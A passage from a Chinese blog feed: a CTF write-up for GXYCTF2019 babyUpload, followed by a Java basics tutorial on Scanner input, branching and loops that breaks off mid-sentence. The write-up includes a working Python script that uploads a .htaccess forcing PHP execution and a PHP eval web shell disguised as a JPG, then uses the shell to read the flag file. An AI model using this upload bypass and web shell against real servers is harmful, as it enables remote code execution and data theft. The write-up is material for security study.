        <content type="html"><![CDATA[<p>简单的双文件上传，可以学习的地方在于如果用python实现脚本化</p><span id="more"></span><h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><p>不断更改构造成这副样子即可绕过限制</p><p><img src="/2021/04/10/GXYCTF2019-babyUpload/image-20210410121833686.png" class="lazyload" data-srcset="/2021/04/10/GXYCTF2019-babyUpload/image-20210410121833686.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210410121833686"></p><p>我们还需要上传一个.htaccess实现解析，其原理查看<a href="http://m0th.top/2021/02/03/%E5%85%B3%E4%BA%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81bypass/">http://m0th.top/2021/02/03/%E5%85%B3%E4%BA%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81bypass/</a></p><p><img src="/2021/04/10/GXYCTF2019-babyUpload/image-20210410122208236.png" class="lazyload" data-srcset="/2021/04/10/GXYCTF2019-babyUpload/image-20210410122208236.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210410122208236"><img src="/2021/04/10/GXYCTF2019-babyUpload/image-20210410122417308.png" class="lazyload" data-srcset="/2021/04/10/GXYCTF2019-babyUpload/image-20210410122417308.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210410122417308"></p><h4 id="脚本实现自动化"><a href="#脚本实现自动化" class="headerlink" title="脚本实现自动化"></a>脚本实现自动化</h4><p>根据主办方wp的写法，学习到了如何通过python脚本实现自动化文件上传</p><p>python的request库传文件</p><p>查了一下文档</p><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>url = <span class="string">&#x27;http://httpbin.org/post&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>multiple_files = [</span><br><span class="line">        (<span class="string">&#x27;images&#x27;</span>, (<span class="string">&#x27;foo.png&#x27;</span>, <span class="built_in">open</span>(<span class="string">&#x27;foo.png&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>), <span class="string">&#x27;image/png&#x27;</span>)),</span><br><span class="line">        (<span class="string">&#x27;images&#x27;</span>, (<span class="string">&#x27;bar.png&#x27;</span>, <span class="built_in">open</span>(<span class="string">&#x27;bar.png&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>), <span class="string">&#x27;image/png&#x27;</span>))]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.post(url, files=multiple_files)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.text</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="string">&#x27;files&#x27;</span>: &#123;<span class="string">&#x27;images&#x27;</span>: <span class="string">&#x27;data:image/png;base64,iVBORw ....&#x27;</span>&#125;</span><br><span class="line">  <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;multipart/form-data; boundary=3131623adb2043caaeb5538cc7aa0b3a&#x27;</span>,</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getflag</span>(<span class="params">url</span>):</span></span><br><span class="line">    session = requests.session()</span><br><span class="line">    htaccess = &#123;<span class="string">&#x27;uploaded&#x27;</span>:(<span class="string">&#x27;.htaccess&#x27;</span>,<span class="string">&quot;SetHandler application/x-httpd-php&quot;</span>,<span class="string">&#x27;image/jpeg&#x27;</span>)&#125;</span><br><span class="line">    res_hta=session.post(url,files=htaccess)</span><br><span class="line"></span><br><span class="line">    files=&#123;<span class="string">&#x27;uploaded&#x27;</span>:(<span class="string">&#x27;123.jpg&#x27;</span>,<span class="string">&quot;&lt;script language=\&quot;php\&quot;&gt;eval($_POST[\&#x27;M0th\&#x27;]);&lt;/script&gt;&quot;</span>,<span class="string">&#x27;image/jpeg&#x27;</span>)&#125;</span><br><span class="line">    res_jpg = session.post(url,files=files)</span><br><span class="line">    <span class="comment">#print(res_jpg.text)</span></span><br><span class="line">    res_shell=session.post(url+res_jpg.text[-<span class="number">69</span>:-<span class="number">22</span>],data=&#123;<span class="string">&#x27;M0th&#x27;</span>:<span class="string">&#x27;echo file_get_contents(\&#x27;/flag\&#x27;);&#x27;</span>&#125;)</span><br><span class="line">    <span class="built_in">print</span>(res_shell.text)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    url=<span class="string">&quot;http://1be2d1cb-e5a9-475e-a280-95bb5d7368be.node3.buuoj.cn/&quot;</span></span><br><span class="line">    getflag(url)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf-Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 双文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java基础语法(二)</title>
      <link href="2021/04/06/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-%E4%BA%8C/"/>
      <url>2021/04/06/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-%E4%BA%8C/</url>
      
        <content type="html"><![CDATA[<p>java的简单的用户交互、方法、流程控制、数组等基础知识</p><span id="more"></span><h2 id="用户交互Scanner"><a href="#用户交互Scanner" class="headerlink" title="用户交互Scanner"></a>用户交互Scanner</h2><p>java.util.Scanner 是JAVA5开始的特性，可以通过Scanner类来获取用户的输入</p><p><code>Scanner s =new Scanner(System.in); </code></p><p>通过Scanner类的 next() 和 nextLine() 方法获取输入的字符串</p><p>用 hasNext() 和 hasNextLine() 判断是否还有输入的数据</p><blockquote><p>next()与nextLine()区别</p></blockquote><p>next()</p><ul><li>一定要读取到有效字符串后才可以结束输入</li><li>对输入有效字符之前遇到的空白，next()方法会自动将其去掉</li><li>只有输入有效字符后才将其后面的空白作为分隔符或者结束符</li><li>next()方法不能得到带有空格的字符串</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo01</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//从键盘接收数据</span></span><br><span class="line">        Scanner scanner =<span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;使用next方式接收:&quot;</span>);</span><br><span class="line">        <span class="comment">//判断是否还有输入</span></span><br><span class="line">        <span class="keyword">if</span>(scanner.hasNext())&#123;</span><br><span class="line">            String str= scanner.next();</span><br><span class="line">            System.out.println(<span class="string">&quot;输出的内容&quot;</span>+str);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//凡是属于IO流的类如果不关闭会一直占用资源，用完就关掉</span></span><br><span class="line">        scanner.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>nextLine()</p><ul><li>以Enter为结束符，也就是说 nextLine()方法返回的是输入回车之前的所有字符</li><li>可以获得空白</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> scanner;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo02</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner scanner = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(scanner.hasNext())&#123;</span><br><span class="line">            String str = scanner.nextLine();</span><br><span class="line">            System.out.println(str);</span><br><span class="line">        &#125;</span><br><span class="line">        scanner.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>scanner输入一些数字类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> scanner;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo04</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner scanner = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//从键盘接收数据</span></span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">float</span> f = <span class="number">0.0F</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;请输入整数:&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(scanner.hasNextInt())&#123;</span><br><span class="line">            i = scanner.nextInt();</span><br><span class="line">            System.out.println(<span class="string">&quot;整数数据:&quot;</span>+i );</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;输入的不是整数数据&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;请输入小数:&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(scanner.hasNextFloat())&#123;</span><br><span class="line">            f =scanner.nextFloat();</span><br><span class="line">            System.out.println(<span class="string">&quot;小数数据:&quot;</span>+f);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;输入的不是小数数据&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        scanner.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> scanner;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo05</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//我们可以输入多个数字，并求其总和与平均数，每输入一个数字用回车确认，通过输入非数字来结束输入并输出执行结果：</span></span><br><span class="line">        Scanner scanner = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        <span class="keyword">double</span> sum =<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> m= <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 通过循环判断是否还有输入，并在里面对每一次进行求和和统计</span></span><br><span class="line">        <span class="keyword">while</span>(scanner.hasNextDouble())&#123;</span><br><span class="line">            <span class="keyword">double</span> x = scanner.nextDouble();</span><br><span class="line">            m = m+<span class="number">1</span>;</span><br><span class="line">            sum = sum +x;</span><br><span class="line">            System.out.println(<span class="string">&quot;你输入了第&quot;</span>+m+<span class="string">&quot;个数据，然后当前结果和为sum=&quot;</span>+sum);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(m+<span class="string">&quot;个数的平均值是&quot;</span>+sum/m);</span><br><span class="line">        scanner.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h2><hr><h3 id="顺序结构"><a href="#顺序结构" class="headerlink" title="顺序结构"></a>顺序结构</h3><p>最基本的结构，没啥好说的，一行一行执行而已</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> struct;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo01</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="选择结构"><a href="#选择结构" class="headerlink" title="选择结构"></a>选择结构</h3><ol><li><p>if 单选择结构</p><blockquote><p>if(布尔表达式){</p><p>​    //如果布尔表达式为true将执行的语句</p><p>}</p></blockquote></li><li><p>if双选择结构</p><blockquote><p>if(布尔表达式){</p><p>​    //如果布尔表达式的值为true</p><p>}else{</p><p>​    //如果布尔表达式的值为false</p><p>}</p></blockquote></li><li><p>if多选择结构</p><blockquote><p>if(布尔表达式 1){</p><p>​    //如果布尔表达式1 的值为 true</p><p>}else if(布尔表达式 2){</p><p>​    //如果布尔表达式 2的值为 true</p><p>}else if(布尔表达式 3){</p><p>​    //如果布尔表达式 3的值为 true</p><p>}else{</p><p>​    //如果以上布尔表达式都不为true 则执行</p><p>}</p></blockquote></li><li><p>switch 多选择结构</p><blockquote><ul><li>byte、short、int 或 char</li><li>从 Java SE 7开始switch 支持字符串String 类型 同时case 标签必须为字符串常量</li></ul></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> struct;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo05</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String name = <span class="string">&quot;狂神&quot;</span>;</span><br><span class="line">        <span class="keyword">switch</span>(name)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;M0th&quot;</span>:</span><br><span class="line">                System.out.println(<span class="string">&quot;M0th&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;狂神&quot;</span>:</span><br><span class="line">                System.out.println(<span class="string">&quot;狂神&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                System.out.println(<span class="string">&quot;无了无了&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过反编译发现，这个特性本身是将字符串转成hashcode然后做正常switch操作、</p><p><img src="/2021/04/06/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-%E4%BA%8C/image-20210407202403977.png" class="lazyload" data-srcset="/2021/04/06/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-%E4%BA%8C/image-20210407202403977.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210407202403977"></p></li></ol><h3 id="循环结构"><a href="#循环结构" class="headerlink" title="循环结构"></a>循环结构</h3><h4 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h4><blockquote><p>while(布尔表达式){</p><p>​    //循环内容</p><p>}</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> struct;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo07</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//输出 1-100</span></span><br><span class="line">        <span class="keyword">int</span> i =<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> sum=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;<span class="number">100</span>)&#123;</span><br><span class="line">            sum=i+sum;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(sum);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="do…while循环"><a href="#do…while循环" class="headerlink" title="do…while循环"></a>do…while循环</h4><p>至少循环一次</p><blockquote><p>do{</p><p>​    //代码语句</p><p>}while(布尔表达式)</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> struct;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo09</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> a = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(a&lt;<span class="number">0</span>)&#123;</span><br><span class="line">            System.out.println(a);</span><br><span class="line">            a --;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;============&quot;</span>);</span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            System.out.println(a);</span><br><span class="line">            a++;</span><br><span class="line">        &#125;<span class="keyword">while</span>(a&lt;<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="for-循环"><a href="#for-循环" class="headerlink" title="for 循环"></a>for 循环</h4><p>for循环语句是支持迭代的一种通用结构，是最有效、最灵活的循环结构</p><p>for循环执行的次数是执行前就确定的</p><blockquote><p>for(初始化; 布尔表达式; 更新){</p><p>​    //代码语句</p><p>}</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> struct;</span><br><span class="line"><span class="comment">//分别求100以内奇数和偶数的和</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo10</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> oddSum=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> evenSum= <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;<span class="number">100</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i%<span class="number">2</span>!=<span class="number">0</span>)&#123; <span class="comment">//奇数</span></span><br><span class="line">                oddSum+=i;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123; <span class="comment">//偶数</span></span><br><span class="line">                evenSum+=i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;奇数的和:&quot;</span>+ oddSum);</span><br><span class="line">        System.out.println(<span class="string">&quot;偶数的和:&quot;</span>+evenSum);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> struct;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo11</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 用while 或者 for循环输出1-1000之间能被5整除的数字，每行三个</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span>; i&lt;=<span class="number">1000</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i%<span class="number">5</span>==<span class="number">0</span>)&#123;</span><br><span class="line">                System.out.print(i+<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(i%<span class="number">15</span>==<span class="number">0</span>)&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//println 输出完换行</span></span><br><span class="line">        <span class="comment">//print 输出完不换行</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> struct;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo12</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= <span class="number">9</span>; j++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= j; i++) &#123;</span><br><span class="line">                System.out.print(j+<span class="string">&quot;*&quot;</span>+i+<span class="string">&quot;=&quot;</span>+(j*i)+<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println();</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">1*1=1</span></span><br><span class="line"><span class="comment">2*1=22*2=4</span></span><br><span class="line"><span class="comment">3*1=33*2=63*3=9</span></span><br><span class="line"><span class="comment">4*1=44*2=84*3=124*4=16</span></span><br><span class="line"><span class="comment">5*1=55*2=105*3=155*4=205*5=25</span></span><br><span class="line"><span class="comment">6*1=66*2=126*3=186*4=246*5=306*6=36</span></span><br><span class="line"><span class="comment">7*1=77*2=147*3=217*4=287*5=357*6=427*7=49</span></span><br><span class="line"><span class="comment">8*1=88*2=168*3=248*4=328*5=408*6=488*7=568*8=64</span></span><br><span class="line"><span class="comment">9*1=99*2=189*3=279*4=369*5=459*6=549*7=639*8=729*9=81</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="增强for循环"><a href="#增强for循环" class="headerlink" title="增强for循环"></a>增强for循环</h4><p>增强for循环只是一种语法糖而已</p><blockquote><p>for(声明语句: 